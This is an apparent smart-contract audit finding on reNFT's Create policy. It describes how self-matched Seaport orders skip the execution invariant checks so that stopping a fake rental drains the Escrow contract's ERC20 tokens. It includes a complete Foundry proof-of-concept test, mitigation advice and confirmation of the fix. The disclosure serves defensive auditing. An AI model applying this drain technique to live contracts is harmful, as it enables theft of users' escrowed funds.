[H-06] Escrow contract can be drained by creating rentals that bypass execution invariant checks
Submitted byjuancito, also found by DeFiHackLabs (1,2,3)
https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544
https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695
The Escrow contract where ERC20 tokens are escrowed for payments can be completely drained.
Proof of Concept
It is possible to create rentals where no assets are transfered, but storage is still updated as normal. Then these fake rentals can be stopped to drain ERC20 tokens from the Escrow contract.
TheCreatecontractchecks the expected receivers of ERC20 tokens and NFTs via_executionInvariantChecks().
This is to make sure that ERC20 tokens go to the Escrow contract, while NFTs go to the corresponding Safe wallet.
The key point of the attack is to fulfill an order, so thatthe executions length is zero and no execution is checked.
This is possible by making the offerer fulfill all the considerations within the same address of the offers.
I’m assuming this is because of point 9 in theMatch Orders section of SeaPort Docs. Nevertheless, since SeaPort was forked, the coded POC still shows how the attack is possible.
Perform transfers as part of each executionIgnore each execution where `to == from``
To put it in an example:
Carol signs a normalPAYrental order with an NFT + ERC20 tokens as an offerCarol signs the maliciousPAYEEcounterpart order setting the recipient as her address (instead of the Safe for the NFT, and the ESCRW for the ERC20 tokens)Carol matches those orders via the forked SeaPortSeaPort calculates thetotalExecutions, and since all offers and considerations are from the same address, there are no executions, as there will be no transfersBoth thePAY&PAYEEordered are fulfilled and callCreate::validateOrder()No recipient checks are performed, since there are no executionsTheSTOREstoragewill add the new rentalfor Carol, whileincreasing the deposit amount in the EscrowSeaPort ends the order matching and fulfillment without performing any transferThe rent can be stopped and it will drain the Escrow contract of any token + amount specified in the fake rent
The following POC proves how this is still possible with the forked SeaPort version and the current contracts.
Note: For the sake of simplicity this POC:
Itdealssome ERC20 tokens to the Escrow contract to be stolen (instead of simulating another legit rental). It doesn’t affect the outcome, as the tokens are stolen, regardless of whom they “belong to”.It uses a fixturecarol.safe = SafeL2(payable(carol.addr));just to make an ad-hoc replacementfor the ERC721 consideration recipientin thePAYEEorder creation, and make the POC shorter. It is reset right aftercreateOrder()is called.It uses a fixtureESCRW = PaymentEscrow(carol.addr);just to make an ad-hoc replacementfor the ERC20 consideration recipientin thePAYEEorder creation, and make the POC shorter. It is reset right aftercreateOrder()is called.
Create a new file with this test insmart-contracts/test/integration/Drain.t.sol:
// SPDX-License-Identifier: BUSL-1.1pragmasolidity^0.8.20;import{Order,FulfillmentComponent,Fulfillment,ItemTypeasSeaportItemType}from"@seaport-types/lib/ConsiderationStructs.sol";import{Errors}from"@src/libraries/Errors.sol";import{OrderType,OrderMetadata,RentalOrder}from"@src/libraries/RentalStructs.sol";import{BaseTest}from"@test/BaseTest.sol";import{ProtocolAccount}from"@test/utils/Types.sol";import{SafeUtils}from"@test/utils/GnosisSafeUtils.sol";import{Safe}from"@safe-contracts/Safe.sol";import{SafeL2}from"@safe-contracts/SafeL2.sol";import{PaymentEscrow}from"@src/modules/PaymentEscrow.sol";contractTestDrainisBaseTest{functiontest_Drain_Escrow()public{// create a legit PAY ordercreateOrder({offerer:carol,orderType:OrderType.PAY,erc721Offers:1,erc1155Offers:0,erc20Offers:1,erc721Considerations:0,erc1155Considerations:0,erc20Considerations:0});// finalize the pay order creation(OrdermemorypayOrder,bytes32payOrderHash,OrderMetadatamemorypayOrderMetadata) =finalizeOrder();// create an order fulfillment for the pay ordercreateOrderFulfillment({_fulfiller:carol,order:payOrder,orderHash:payOrderHash,metadata:payOrderMetadata});// << Malicious order creation below >>// fixtures to replace the ERC721 and ERC20 recipients in `createOrder()`SafeL2carolSafe=carol.safe;PaymentEscrowtempESCRW=ESCRW;carol.safe=SafeL2(payable(carol.addr));ESCRW=PaymentEscrow(carol.addr);// create a malicious PAYEE order.// It will set the ERC721 and ERC20 recipients as Carol herselfcreateOrder({offerer:carol,orderType:OrderType.PAYEE,erc721Offers:0,erc1155Offers:0,erc20Offers:0,erc721Considerations:1,erc1155Considerations:0,erc20Considerations:1});// reset fixturescarol.safe=carolSafe;ESCRW=tempESCRW;// finalize the pay order creation(OrdermemorypayeeOrder,bytes32payeeOrderHash,OrderMetadatamemorypayeeOrderMetadata) =finalizeOrder();// create an order fulfillment for the payee ordercreateOrderFulfillment({_fulfiller:carol,order:payeeOrder,orderHash:payeeOrderHash,metadata:payeeOrderMetadata});// add an amendment to include the seaport fulfillment structswithLinkedPayAndPayeeOrders({payOrderIndex:0,payeeOrderIndex:1});// Verify Carol's balances and the Escrow balance before the rental attack is performedassertEq(erc20s[0].balanceOf(carol.addr),uint256(10000));assertEq(erc721s[0].ownerOf(0),address(carol.addr));assertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(0));// finalize the order pay/payee order fulfillment(RentalOrdermemorypayRentalOrder,RentalOrdermemorypayeeRentalOrder) =finalizePayOrderFulfillment();// << The first part of the attack was performed >>// A new rental was created without any token transfers// get the rental order hashesbytes32payRentalOrderHash=create.getRentalOrderHash(payRentalOrder);bytes32payeeRentalOrderHash=create.getRentalOrderHash(payeeRentalOrder);// assert that the rental order WAS STOREDassertEq(STORE.orders(payRentalOrderHash),true);// assert that the token IS IN STORAGEassertEq(STORE.isRentedOut(address(carol.safe),address(erc721s[0]),0),true);// assert that Carol DID NOT MAKE A PAYMENT (same balance as before)assertEq(erc20s[0].balanceOf(carol.addr),uint256(10000));// assert that NO PAYMENT WAS MADE to the Escrow contractassertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(0));// assert that a payment was synced ERRONEOUSLY in the escrow contract (as no payment was made)assertEq(ESCRW.balanceOf(address(erc20s[0])),uint256(100));// assert that the ERC721 IS STILL owned by Carol (it didn't go to the Safe wallet)assertEq(erc721s[0].ownerOf(0),address(carol.addr));// << The second part of the attack is performed >>// speed up in time past the rental expiration// it uses the default values, but an attacker would make the expiration as soon as possiblevm.warp(block.timestamp+750);// Transfer the NFT to the Safe, so that the rent stop succeeds while trying to transfer the NFT backvm.prank(carol.addr);erc721s[0].safeTransferFrom(carol.addr,address(carol.safe),0);// Deal some tokens to the Escrow to be stolen// An attacker would first check the tokens balances of the Escrow contract and craft rents matching themdeal(address(erc20s[0]),address(ESCRW),100);assertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(100));// stop the rental ordervm.prank(carol.addr);stop.stopRent(payRentalOrder);// Carol gets back her NFT, while stealing the ERC20 tokens from the EscrowassertEq(erc20s[0].balanceOf(carol.addr),uint256(10100));assertEq(erc721s[0].ownerOf(0),address(carol.addr));// The Escrow contract was drainedassertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(0));}}
Recommended Mitigation Steps
I would suggest to check that the corresponding offers / considerations are actually included in thetotalExecutionsandcompletely fulfilledwith theircorresponding recipients.
Adding some notes for the protocol to understand the attack surface:
There are other scenarios possible not exposed on the POC. For example, fulfilling just the NFT as expected to the safe, and only performing the attack on the ERC20, leaving atotalExecutionslength of 1 (the NFT).  This can be done with ERC1155 as well.
Another possibility would be to fulfill the orders with multiple other ones, which could generate extra phantom executions.
Also note, that it is possible to evoid fulfillingPAYEEorders via the zone (as noted on another issue I sent).
All that said regarding the current scope, it would also be recommended to give a second look to the forked SeaPort implementation implementingtotalExecutionsto check if there could be another related attack vector there.
Alec1017 (reNFT) confirmed
reNFT mitigated:
The PRhere- Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.
Status:Mitigation confirmed. Full details in reports fromjuancito,EV_omandsin1st3r__.